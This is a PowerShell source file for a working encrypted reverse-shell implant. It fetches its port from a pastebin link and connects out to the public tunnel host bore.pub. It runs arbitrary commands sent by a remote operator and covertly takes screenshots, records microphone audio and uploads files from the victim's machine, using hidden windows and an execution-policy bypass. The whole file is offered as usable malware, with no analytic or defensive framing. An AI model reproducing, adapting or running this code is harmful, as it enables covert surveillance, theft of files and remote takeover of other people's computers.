# client.ps1
$pastebin_url = "https://pastebin.com/raw/E0gQFhkz"
$BORE_PORT = [int](Invoke-WebRequest -Uri $pastebin_url | Select-Object -ExpandProperty Content)

# Add encryption class with password
Add-Type -AssemblyName System.Security

class Encryption {
    # Password must match the server's password
    static [string] $Password = "SuperSecretPassword123"
    static [byte[]] $Key

    static Encryption() {
        # Generate key from password using SHA-256 (same as server)
        $sha256 = [System.Security.Cryptography.SHA256]::Create()
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes([Encryption]::Password)
        [Encryption]::Key = $sha256.ComputeHash($keyBytes)
    }

    static [string] Encrypt([string]$message) {
        $messageBytes = [System.Text.Encoding]::UTF8.GetBytes($message)
        
        # Create AES instance
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = [Encryption]::Key
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        
        # Encrypt the message
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($messageBytes, 0, $messageBytes.Length)
        
        # Combine IV and encrypted data
        $result = New-Object byte[] ($aes.IV.Length + $encryptedData.Length)
        [Array]::Copy($aes.IV, 0, $result, 0, $aes.IV.Length)
        [Array]::Copy($encryptedData, 0, $result, $aes.IV.Length, $encryptedData.Length)
        
        # Convert to base64 for transmission
        return [Convert]::ToBase64String($result)
    }

    static [string] Decrypt([string]$encryptedMessage) {
        try {
            # Decode from base64
            $encryptedBytes = [Convert]::FromBase64String($encryptedMessage)
            
            # Extract IV (first 16 bytes)
            $iv = New-Object byte[] 16
            [Array]::Copy($encryptedBytes, 0, $iv, 0, 16)
            
            # Extract encrypted data
            $encryptedData = New-Object byte[] ($encryptedBytes.Length - 16)
            [Array]::Copy($encryptedBytes, 16, $encryptedData, 0, $encryptedData.Length)
            
            # Create AES instance for decryption
            $aes = [System.Security.Cryptography.Aes]::Create()
            $aes.Key = [Encryption]::Key
            $aes.IV = $iv
            $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
            $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
            
            # Decrypt
            $decryptor = $aes.CreateDecryptor()
            $decryptedBytes = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
            
            return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        }
        catch {
            Write-Error "Decryption error: $_"
            return ""
        }
    }
}

class ReverseShellClient {
    [string]$host_addr
    [int]$port

    ReverseShellClient([string]$host_addr, [int]$port) {
        $this.host_addr = $host_addr
        $this.port = $port
    }

    [string] TakeScreenshot() {
        try {
            $timestamp = Get-Date -Format "yyyyMMddHHmmss"
            $tempFile = Join-Path $env:TEMP "sc$timestamp.png"
            $scriptPath = Join-Path $env:TEMP "sc$timestamp.ps1"

            $scriptContent = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    $form = New-Object Windows.Forms.Form
    $form.TopMost = $true
    $form.ShowInTaskbar = $false
    $form.WindowState = [Windows.Forms.FormWindowState]::Minimized
    
    $form.Show()
    [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}")
    Start-Sleep -Milliseconds 500
    
    $bitmap = [System.Windows.Forms.Clipboard]::GetImage()
    
    if ($bitmap) {
        $bitmap.Save("TEMP_PATH", [System.Drawing.Imaging.ImageFormat]::Png)
    }
    
    $form.Close()
} finally {
    if ($bitmap) { $bitmap.Dispose() }
    if ($form) { $form.Dispose() }
}
'@
            $scriptContent = $scriptContent.Replace("TEMP_PATH", $tempFile)
            $scriptContent | Out-File -FilePath $scriptPath -Force
            
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow -Wait
            Start-Sleep -Seconds 1

            if (Test-Path $tempFile) {
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                $base64 = [Convert]::ToBase64String($bytes)

                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

                return "SCREENSHOT:$base64"
            } else {
                throw "Screenshot file not created"
            }
        }
        catch {
            return "Screenshot failed: $_"
        }
    }

    [string] CaptureAudio([int]$duration) {
        try {
            $timestamp = Get-Date -Format "yyyyMMddHHmmss"
            $tempFile = Join-Path $env:TEMP "audio_$timestamp.wav"
            $scriptPath = Join-Path $env:TEMP "audio_$timestamp.ps1"

            $scriptContent = @'
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class AudioCapture {
    [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi)]
    public static extern int mciSendString(string lpstrCommand,
        string lpstrReturnString, int uReturnLength, IntPtr hwndCallback);
}
"@

try {
    [AudioCapture]::mciSendString("open new Type waveaudio Alias capture", "", 0, [IntPtr]::Zero)
    [AudioCapture]::mciSendString("set capture bitspersample 16", "", 0, [IntPtr]::Zero)
    [AudioCapture]::mciSendString("set capture channels 2", "", 0, [IntPtr]::Zero)
    [AudioCapture]::mciSendString("set capture samplespersec 44100", "", 0, [IntPtr]::Zero)

    [AudioCapture]::mciSendString("record capture", "", 0, [IntPtr]::Zero)
    Start-Sleep -Seconds DURATION_PLACEHOLDER
    
    [AudioCapture]::mciSendString("stop capture", "", 0, [IntPtr]::Zero)
    [AudioCapture]::mciSendString("save capture `"TEMP_PATH`"", "", 0, [IntPtr]::Zero)
    [AudioCapture]::mciSendString("close capture", "", 0, [IntPtr]::Zero)
}
catch {
    Write-Error $_.Exception.Message
}
'@
            $scriptContent = $scriptContent.Replace("DURATION_PLACEHOLDER", $duration)
            $scriptContent = $scriptContent.Replace("TEMP_PATH", $tempFile)
            
            $scriptContent | Out-File -FilePath $scriptPath -Force
            Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -NoNewWindow -Wait

            Start-Sleep -Seconds ($duration + 1)

            if (Test-Path $tempFile) {
                $bytes = [System.IO.File]::ReadAllBytes($tempFile)
                $base64 = [Convert]::ToBase64String($bytes)

                Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
                Remove-Item $tempFile -Force -ErrorAction SilentlyContinue

                return "AUDIO:$base64"
            } else {
                throw "Audio file not created"
            }
        }
        catch {
            return "Audio capture failed: $_"
        }
    }

    [string] ExecuteCommand([string]$command) {
        try {
            if ($command -eq "is online") {
                return "yes"
            }
            elseif ($command -eq "whoami") {
                # Get both PC name and username
                $computerName = $env:COMPUTERNAME
                $userName = $env:USERNAME
                return "$computerName\$userName"
            }
            elseif ($command -eq "getsc") {
                return $this.TakeScreenshot()
            }
            elseif ($command -match "^cupv\s+(\d+)$") {
                $duration = [int]$matches[1]
                return $this.CaptureAudio($duration)
            }
            elseif ($command -match "^upload\s+(.+)$") {
                $filepath = $matches[1].Trim()
                if (Test-Path $filepath) {
                    try {
                        $bytes = [System.IO.File]::ReadAllBytes($filepath)
                        $base64 = [Convert]::ToBase64String($bytes)
                        $filename = Split-Path $filepath -Leaf
                        return "UPLOAD:$filename|$base64"
                    }
                    catch {
                        return "Error reading file: $($_.Exception.Message)"
                    }
                }
                else {
                    return "Error: File '$filepath' does not exist."
                }
            }
            elseif ($command -eq "pwd") {
                return (Get-Location).Path
            }
            elseif ($command -eq "ls") {
                return (Get-ChildItem | Select-Object Name | Format-Table -HideTableHeaders | Out-String).Trim()
            }
            else {
                # First try running as a Windows command
                $output = ""
                try {
                    $output = & cmd.exe /c $command 2>&1 | Out-String
                    if ($output) {
                        return $output.Trim()
                    }
                }
                catch {
                    # If Windows command fails, try as PowerShell command
                    try {
                        $output = Invoke-Expression $command 2>&1 | Out-String
                        if ($output) {
                            return $output.Trim()
                        }
                    }
                    catch {
                        return $_.Exception.Message
                    }
                }
                return "Command executed successfully"
            }
        }
        catch {
            return $_.Exception.Message
        }
    }

    [void] Connect() {
        while ($true) {
            try {
                $client = New-Object System.Net.Sockets.TcpClient
                $client.Connect($this.host_addr, $this.port)
                $stream = $client.GetStream()
                $buffer = New-Object byte[] 4096

                while ($client.Connected) {
                    $command = ""
                    do {
                        $read = $stream.Read($buffer, 0, $buffer.Length)
                        if ($read -le 0) { throw "Disconnected" }
                        $command += [System.Text.Encoding]::ASCII.GetString($buffer, 0, $read)
                    } while ($stream.DataAvailable)

                    # Decrypt the received command
                    $command = [Encryption]::Decrypt($command.Trim())
                    if ($command -eq "") { continue }
                    if ($command -eq "exit") { break }

                    $output = $this.ExecuteCommand($command)
                    # Encrypt the response before sending
                    $encrypted_output = [Encryption]::Encrypt($output)
                    $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($encrypted_output + "`n")
                    $stream.Write($outputBytes, 0, $outputBytes.Length)
                    $stream.Flush()
                }

                $stream.Close()
                $client.Close()
            }
            catch {
                Start-Sleep -Seconds 3
            }
        }
    }
}

$BORE_HOST = "bore.pub"
$client = [ReverseShellClient]::new($BORE_HOST, $BORE_PORT)
$client.Connect()
